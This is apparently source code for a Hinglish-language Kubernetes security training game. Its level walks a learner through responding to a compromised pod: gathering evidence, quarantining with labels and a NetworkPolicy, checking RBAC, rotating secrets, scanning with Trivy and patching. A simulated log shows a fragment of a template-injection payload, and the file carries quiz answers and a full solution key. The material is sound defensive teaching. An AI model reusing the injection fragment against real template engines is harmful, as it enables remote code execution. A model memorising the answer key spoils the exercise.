  { text: 'Ab alag kiye pod ko <b>delete</b> karo', check: s => !!s.cluster.deleted },
];
function quarantine(s, full) {
  const c = s.cluster, p = c.pods.find(x => x.name === QP);
  if (!p) return `Error from server (NotFound): pods "${QP}" not found`;
  if (!full) { p.labels = { app: 'notify', quarantine: 'true' }; return `pod/${QP} labeled\n(label quarantine=true lag gaya, par label app=notify ABHI BHI hai. Pod abhi bhi Service notify-svc ke peeche hai aur traffic le raha hai. app- bhi jodo: kubectl label pod ${QP} app- quarantine=true)`; }
  if (c.isolated) return `pod/${QP} not labeled`;
  c.isolated = true;
  p.labels = { quarantine: 'true' };
  c.pods.push({ name: 'notify-5c9d4f-n9', ready: '1/1', status: 'Running', restarts: 0, age: '8s', node: 'node-1', ip: '10.244.1.52', top: '150m 92Mi', labels: { app: 'notify' } });
  c.endpoints[0].endpoints = '10.244.1.52:8080';
  return `pod/${QP} unlabeled\npod/${QP} labeled\n(label app=notify hata → pod Service notify-svc ke Endpoints se bahar, aur ReplicaSet ne use apna maanna chhod diya.\n ReplicaSet ne turant naya pod notify-5c9d4f-n9 banaya — notify ke SMS chalte rahenge. Dhyaan do: naya pod bhi purani image 2.3.0 par hai.)`;
}

KG.registerLevels('secure', [
  {
    id: 'sec-boss',
    icon: '👑',
    title: 'BOSS: raat 2:14 — notify pod mein attacker',
    badge: 'Kavach Karta',
    objectives: [
      'Compromise hue pod ko sahi kram mein sambhalna — poora, haath se',
      'Least privilege ka faayda ghatna ke waqt dekhna',
      'Image scan se ghusne ka raasta dhoondhna aur band karna',
      'Chaaron deewaron ko ek kahani mein jodna',
    ],
    lesson: [
      `<h3>👑 Boss level: ab tum on-call ho</h3>
       <p>Pichhle level mein tumne faisle <b>chune</b> the. Is level mein tum unhe <b>khud chalaoge</b>, asli commands se.</p>
       <p><b>Kahani:</b> raat 2:14. Falco ne <code>notify-5c9d4f-k3</code> pod se teen alert bheje: shell, naya binary, mining pool ka connection.
       Pod <code>Running</code> hai. CPU 1980m.</p>
       <p><b>Kram (yaad hai?):</b></p>
       <ol>
         <li>🗂️ Saboot</li>
         <li>🚧 Alag karo — label + network</li>
         <li>🔍 Token kya padh sakta tha?</li>
         <li>🔑 Raaz badlo</li>
         <li>🩹 Wajah band karo (patch)</li>
         <li>🗑️ Ab hatao</li>
       </ol>
       <p>Is mission mein saboot ko pehle rakha gaya hai: pod alag karne se pehle uski chalti haalat ka ek record le lo.</p>`,
    ],
    stages: [
      {
        type: 'terminal',
        title: '🖥️ Boss Mission: attacker ko gherna',
        instructions: 'Tum on-call ho. Pod ko delete karne ki jaldi mat karo — simulator rok dega aur wajah batayega.',
        goal: `Pod <code>${QP}</code> compromise ho chuka hai. Ise <b>sahi kram mein</b> sambhalo.<br>
          Kaam ke roop: <code>kubectl label pod ${QP} app- quarantine=true</code> ·
          <code>kubectl auth can-i --list --as=${SA}</code> · <code>trivy image chaipay/notify:2.3.0</code> · files ke liye <code>ls</code>.`,
        tasks: T_SECBOSS,
        cluster: {
          nodes: [{ name: 'node-1', status: 'Ready', roles: '<none>', age: '40d', version: 'v1.33.4' }],
          pods: [
            { name: QP, ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.21', top: '1980m 310Mi', labels: { app: 'notify' },
              logs: 'notify: sent 212 SMS in last minute\nnotify: template render: unexpected token in "{{#with constructor}}"\nnotify: sent 198 SMS in last minute\n(dhyaan do: ek ajeeb template — yahin se attacker ne command chalaya)',
              describe: `Name:             ${QP}\nNamespace:        payments\nService Account:  notify-sa\nLabels:           app=notify\nStatus:           Running\nContainers:\n  notify:\n    Image:  chaipay/notify:2.3.0` },
            { name: 'pay-api-6b8d7c-a1', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.20', top: '410m 600Mi', labels: { app: 'pay-api' } },
            { name: 'ledger-0', ready: '1/1', status: 'Running', restarts: 0, age: '9d', node: 'node-1', ip: '10.244.1.30', top: '220m 900Mi', labels: { app: 'ledger' } },
          ],
          deployments: [{ name: 'notify', ready: '1/1', upToDate: 1, available: 1, age: '40d' }, { name: 'pay-api', ready: '1/1', upToDate: 1, available: 1, age: '40d' }],
          services: [{ name: 'notify-svc', type: 'ClusterIP', clusterIP: '10.96.15.2', ports: '8080/TCP', age: '40d' }],
          endpoints: [{ name: 'notify-svc', endpoints: '10.244.1.21:8080', age: '40d' }],
          networkpolicies: [],
        },
        responses: [
          { re: new RegExp('^kubectl delete (pods?|po)[ /]' + QP + '\\b'),
            mutate: s => {
              const c = s.cluster;
              if (!c.evidence || !c.isolated || !c.patched) { c.lastDel = null; return; }
              const i = c.pods.findIndex(x => x.name === QP);
              if (i > -1) c.pods.splice(i, 1);
              c.deleted = true; c.lastDel = `pod "${QP}" deleted`;
            },
            out: s => s.cluster.lastDel || ('(simulator ne roka) Abhi delete mat karo. ' +
              (!s.cluster.evidence ? 'Saboot ikattha nahi hua — delete karte hi pod ke logs aur haalat hamesha ke liye gaye.'
               : !s.cluster.isolated ? 'Pod abhi bhi ReplicaSet ka hai — delete karoge toh ReplicaSet wahi kamzor image ka naya pod bana dega, aur tumhare paas jaanchne ko kuch nahi bachega.'
               : 'notify abhi bhi kamzor image 2.3.0 par chal raha hai. Pehle wajah band karo (patched image), phir safai.')) },
          { re: new RegExp('^kubectl label (pods?|po)[ /]' + QP + '\\b(?=.*\\bquarantine=true\\b)(?=.*(^| )app-( |$))'), mutate: s => { s.cluster.lastLabel = quarantine(s, true); }, out: s => s.cluster.lastLabel || '' },
          { re: new RegExp('^kubectl label (pods?|po)[ /]' + QP + '\\b(?=.*\\bquarantine=true\\b)'), mutate: s => { s.cluster.lastLabel = quarantine(s, false); }, out: s => s.cluster.lastLabel || '' },
          { re: new RegExp('^kubectl label (pods?|po)[ /]' + QP + '\\b'), err: true, out: `Do badlaav chahiye, ek hi command mein:\n  app-             → label app hatao (Service aur ReplicaSet se bahar)\n  quarantine=true  → naya label (isi par NetworkPolicy lagegi)\nRoop: kubectl label pod ${QP} app- quarantine=true` },
          { re: /^kubectl auth can-i --list\b(?=.*--as[= ]system:serviceaccount:payments:notify-sa)/, mutate: s => { s.cluster.sawAccess = true; },
            out: 'Resources    Non-Resource URLs   Resource Names       Verbs\nsecrets      []                  [sms-provider-key]   [get]\nconfigmaps   []                  [notify-templates]   [get]\n(notify ka token do hi cheezein padh sakta tha. Raaz ek hi hai: sms-provider-key. Ise padha hua maano.)' },
          { re: /^kubectl auth can-i\b/, err: true, out: 'Roop: kubectl auth can-i --list --as=' + SA },
          { re: /^trivy image( --\S+( \S+)?)* chaipay\/notify:2\.3\.0$/,
            out: 'chaipay/notify:2.3.0 (node-pkg)\n\nTotal: 1 (CRITICAL: 1)\n\n│ Library       │ Severity │ Installed │ Fixed │ Title                                       │\n│ tmpl-renderer │ CRITICAL │ 4.1.2     │ 4.1.5 │ Remote code execution via crafted template  │\n(ghusne ka raasta yahi hai. Fix 4.1.5 mein hai — image chaipay/notify:2.3.1 mein yahi version hai.)' },
          { re: /^trivy image( --\S+( \S+)?)* chaipay\/notify:2\.3\.1$/, out: 'chaipay/notify:2.3.1 (node-pkg)\n\nTotal: 0 (CRITICAL: 0)' },
          { re: /^trivy\b/, err: true, out: 'Is mission mein: trivy image chaipay/notify:2.3.0   ·   trivy image chaipay/notify:2.3.1' },
        ],
        files: {
          'collect-evidence.sh': {
            desc: 'Pod ke logs, describe aur YAML ko files mein bachata hai',
            content: `#!/bin/sh\nP=${QP}\nkubectl logs $P --all-containers --timestamps > evidence-logs.txt\nkubectl describe pod $P                     > evidence-describe.txt\nkubectl get pod $P -o yaml                  > evidence-pod.yaml\nkubectl get events --field-selector involvedObject.name=$P > evidence-events.txt\n# Falco ke alerts bhi saath rakho\nkubectl logs -n falco ds/falco | grep $P    > evidence-falco.txt`,
            apply: s => { s.cluster.evidence = true; return 'evidence-logs.txt, evidence-describe.txt, evidence-pod.yaml, evidence-events.txt, evidence-falco.txt likh diye gaye.\n(ab pod ke saath kuch bhi ho, yeh record bacha rahega)'; },
          },
          'quarantine-netpol.yaml': {
            desc: 'NetworkPolicy: label quarantine=true wale pods ka andar-bahar ka saara network band',
            content: 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: quarantine\n  namespace: payments\nspec:\n  podSelector:\n    matchLabels:\n      quarantine: "true"\n  policyTypes: ["Ingress", "Egress"]\n  # koi ingress / egress rule nahi → sab kuch band',
            apply: s => {
              const c = s.cluster;
              if (!c.netpol) { c.netpol = true; c.networkpolicies.push({ name: 'quarantine', podSelector: 'quarantine=true', age: '3s' }); }
              return 'networkpolicy.networking.k8s.io/quarantine ' + (c.isolated
                ? 'created\n(quarantine=true wale pod ka saara network band. Miner ab mining pool tak nahi pahunch sakta, aur attacker cluster ke kisi aur pod tak nahi.)'
                : 'created\n(policy ban gayi, par abhi kisi pod par label quarantine=true nahi hai — policy kisi ko nahi chun rahi. Pod par label lagao.)');
            },
          },
          'rotate-sms-key.sh': {
            desc: 'SMS provider se nayi key banata hai, Secret sms-provider-key badalta hai, purani key band karta hai',
            content: '#!/bin/sh\n# 1. provider ke dashboard/API se nayi key\n# 2. kubectl create secret generic sms-provider-key --from-literal=key=NEW --dry-run=client -o yaml | kubectl apply -f -\n# 3. notify ko restart taaki nayi key le\n# 4. provider par PURANI key ko revoke — yeh kadam hi asli hai',
            apply: s => {
              const c = s.cluster;
              if (!c.sawAccess) return '(simulator ne roka) Pehle dekho ki notify ka token kya-kya padh sakta tha. Bina jaane key badloge toh ya toh kuch chhoot jayega, ya zaroorat se zyada badal doge.\n  kubectl auth can-i --list --as=' + SA;
              c.rotated = true;
              return 'secret/sms-provider-key configured\nSMS provider: purani key revoked ✓\n(attacker ne key padh bhi li ho, toh ab woh key bekaar hai)';
            },
          },
          'notify-2.3.1.yaml': {
            desc: 'notify Deployment ko patched image chaipay/notify:2.3.1 par le jaata hai',
            content: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notify\n  namespace: payments\nspec:\n  template:\n    spec:\n      containers:\n        - name: notify\n          image: chaipay/notify:2.3.1     # tmpl-renderer 4.1.5 — RCE ka fix',
            apply: s => {
              const c = s.cluster;
              if (c.patched) return 'deployment.apps/notify unchanged';
              c.patched = true;
              const keep = c.pods.filter(p => p.name === QP || !/^notify-/.test(p.name));
              keep.push({ name: 'notify-8e7d6c-p1', ready: '1/1', status: 'Running', restarts: 0, age: '12s', node: 'node-1', ip: '10.244.1.60', top: '148m 90Mi', labels: { app: 'notify' } });
              c.pods = keep;
              if (c.isolated) c.endpoints[0].endpoints = '10.244.1.60:8080';
              return 'deployment.apps/notify configured\n(notify ka naya pod notify-8e7d6c-p1 patched image 2.3.1 par Running hai. Ghusne ka raasta band.)';
            },
          },
        },
        success: KG.allOf(T_SECBOSS),
        successText: `Poora kram, tumhare haath se: <b>saboot</b> → <b>alag</b> (label + NetworkPolicy) → <b>token ki pahunch</b> → <b>raaz badla</b> → <b>patch</b> → <b>delete</b>.<br>
          <b>Do baatein dekho:</b> (1) Label hatate hi ReplicaSet ne naya pod bana diya — notify ek second ke liye bhi band nahi hua. (2) Least privilege ki wajah se sirf <b>ek</b> key badalni padi.<br>
          <b>Kal subah ka kaam:</b> CI mein Trivy ka darwaza (CRITICAL par build fail), taaki 2.3.0 jaisi image agli baar release hi na ho.`,
        hints: [
          'bash collect-evidence.sh, phir kubectl label pod ' + QP + ' app- quarantine=true, phir kubectl apply -f quarantine-netpol.yaml',
          'kubectl auth can-i --list --as=' + SA + ' → sms-provider-key. Phir bash rotate-sms-key.sh',
          'trivy image chaipay/notify:2.3.0 → fix 2.3.1 mein. kubectl apply -f notify-2.3.1.yaml, aur aakhir mein kubectl delete pod ' + QP,
        ],
        solution: [
          'kubectl get pods',
          'kubectl top pods',
          'bash collect-evidence.sh',
          `kubectl label pod ${QP} app- quarantine=true`,
          'kubectl apply -f quarantine-netpol.yaml',
          'kubectl auth can-i --list --as=' + SA,
          'bash rotate-sms-key.sh',
          'trivy image chaipay/notify:2.3.0',
          'kubectl apply -f notify-2.3.1.yaml',
          `kubectl delete pod ${QP}`,
        ],
      },
      {
        type: 'bins',
        title: 'Kaun si deewar yeh rokti?',
        instructions: 'Har ghatna ke liye socho: chaaron mein se kaun si deewar ise sabse pehle rok ya pakad leti?',
        bins: [
          { id: 'img', label: '📦 Image ki jaanch' },
          { id: 'pol', label: '🛂 Admission policy' },
          { id: 'rbac', label: '🪪 Least privilege' },
          { id: 'rt', label: '🦅 Runtime nazar' },
        ],
        items: [
          { text: 'Release hui image mein ek jaani hui CRITICAL kamzori thi', bin: 'img', explain: 'CI mein Trivy ka darwaza is image ko release hi nahi hone deta.' },
          { text: 'Developer ne privileged: true wala pod deploy kar diya', bin: 'pol', explain: 'Yeh pod ke roop ka sawal hai. Admission policy darwaze par mana kar deti.' },
          { text: 'Chori hue token se attacker ne namespace ke saare Secrets padh liye', bin: 'rbac', explain: 'Token ke paas "list secrets" hona hi galti thi. Least privilege mein yeh ijaazat hoti hi nahi.' },
          { text: 'Chalte container ke andar kisi ne shell khol kar ek script utaari', bin: 'rt', explain: 'Image saaf, YAML sahi, token chhota — phir bhi andar ki harkat sirf runtime detection dekh sakta hai.' },
          { text: 'Kisi ne registry mein bahar ki image chupke se daal di aur Deployment ne use chala liya', bin: 'img', explain: 'Signature ki jaanch: bina ChaiPay ke signature wali image darwaze par ruk jaati.' },
          { text: 'notify pod seedha ledger ke database port se jud gaya, jabki notify ko database se koi kaam nahi', bin: 'rbac', explain: 'Least privilege sirf token nahi, network bhi hai: NetworkPolicy se notify database tak pahunch hi nahi sakta.' },
        ],
      },
    ],
    interview: {
      title: 'Interview Round — poori suraksha',
      instructions: 'Aakhri round. Interviewer ek hamle ki kahani sunna chahta hai — shuru se aakhir tak. 🎤',
      questions: [
        {
          q: '"Defense in depth ka matlab apne shabdon mein samjhao, Kubernetes ki misaal ke saath."',
          choices: [
            'Ek hi bahut mazboot deewar banana, jaise sirf network firewall, taaki baaki ki zaroorat na pade',
            'Kai alag deewarein — image jaanch, policy, least privilege, runtime nazar — ek toote toh agli roke',
            'Har pod ko alag cluster mein chalana taaki koi pod doosre ko chhoo na sake',
            'Saare logon ko cluster-admin dena taaki ghatna ke waqt koi ruke nahi',
          ],
          answer: 1,
          explain: 'Koi ek deewar poori nahi hoti. Maqsad yeh hai ki attacker ko har kadam par ek nayi rukawat mile, aur har kadam shor kare. Sawal "kya koi ghusega" nahi, "ghusne ke baad use kya milega aur humein kab pata chalega".',
        },
        {
          q: '"Tumne compromise hue pod par se label app hata diya. Isse do cheezein hui. Kaun si?"',
          choices: [
            'Pod turant delete ho gaya, aur uske logs S3 mein chale gaye',
            'Pod ka token bekaar ho gaya, aur pod ka IP badal gaya',
            'Pod Service ke Endpoints se nikla; ReplicaSet ne naya pod banaya',
            'Pod ka network band ho gaya, aur node cordon ho gaya',
          ],
          answer: 2,
          explain: 'Service aur ReplicaSet dono pods ko label se chunte hain. Label hatte hi: traffic band (Service), aur ginti poori karne ke liye naya pod (ReplicaSet). Network band karna alag kadam hai — NetworkPolicy.',
        },
        {
          q: '"Ghatna ke baad tum kaise tay karte ho ki kaun se raaz (secrets) rotate karne hain?"',
          choices: [
            'Sirf woh raaz jinke baare mein log mein likha ho ki attacker ne padhe',
            'Woh saare raaz jo compromise hue pod ka token ya pod ka network padh sakta tha',
            'Koi nahi — agar attacker sirf miner chala raha tha toh raaz surakshit hain',
            'Poori company ke saare raaz, har baar, bina kisi jaanch ke',
          ],
          answer: 1,
          explain: 'Jo padha ja SAKTA tha, use padha hua maano. Daayra do cheezon se tay hota hai: pod ke mount kiye hue Secrets/env, aur token ki RBAC ijaazat (can-i --list). Isi liye least privilege ghatna ke din ghante bachata hai.',
        },
      ],
    },
    success: [
      'Main compromise hue pod ko poore kram mein, commands ke saath, sambhal sakta hoon',
      'Main bata sakta hoon ki kaun si deewar kaun sa hamla rokti hai',
      'Main ghatna ke baad rotate hone wale raazon ka daayra nikaal sakta hoon',
    ],
    homework: `<p>Asli cluster par: <b>🧪 Real Lab 20 — pod ko quarantine karna</b> (Home → Real Cluster Labs). Wahan tum label aur NetworkPolicy ka asar khud dekhoge.</p>
      <pre>kubectl label pod &lt;pod&gt; app- quarantine=true
kubectl get endpoints &lt;svc&gt;          # pod ka IP gayab?
kubectl get pods -L app,quarantine   # naya pod ban gaya?</pre>`,
    cards: [
      { front: 'Chaar suraksha deewarein?', back: '(1) Image ki jaanch (scan + signature) · (2) Admission policy · (3) Least privilege (RBAC + NetworkPolicy) · (4) Runtime nazar (Falco + jawab).' },
      { front: 'Pod se label <code>app</code> hatane par do asar?', back: 'Pod Service ke Endpoints se bahar (traffic band), aur ReplicaSet naya pod banata hai (service chalti rehti hai).' },
      { front: 'Ghatna ke baad kaun se raaz rotate karne hain?', back: 'Jo compromise hua pod padh <b>sakta</b> tha: mount kiye Secrets + token ki RBAC ijaazat (<code>can-i --list</code>).' },
      { front: 'Ghatna ke baad ka sabse zaroori sudhaar (is kahani mein)?', back: 'CI mein image scan ka darwaza: CRITICAL (jiska fix hai) par build fail.' },
    ],
  },
]);

})();
